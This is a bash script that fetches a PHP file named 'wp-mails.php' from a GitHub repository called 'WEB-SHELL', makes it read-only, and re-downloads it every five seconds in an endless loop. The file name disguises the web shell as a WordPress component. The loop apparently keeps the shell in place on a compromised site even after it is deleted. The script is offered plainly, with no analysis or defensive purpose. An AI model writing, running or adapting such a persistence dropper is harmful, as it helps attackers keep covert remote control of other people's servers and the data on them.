#!/bin/bash

file_path="wp-mails.php"
url="https://raw.githubusercontent.com/dombatersesat666/WEB-SHELL/main/wp-mails.php"

# Function to download and set permissions for wp-mails.php
download_and_set_permissions() {
  # Download the file using curl in silent mode
  curl -s -o "$file_path" "$url"

  # Change the file permissions to 0444
  chmod 0444 "$file_path"

  echo "File wp-mails.php downloaded and permissions set to 0444."
}

# Download and set permissions for the file
download_and_set_permissions

# Infinite loop with sleep to keep checking and updating the file
while true; do
  # Redownload and set permissions for the file (to handle updates)
  download_and_set_permissions

  # Sleep for 5 seconds before checking again
  sleep 5
done
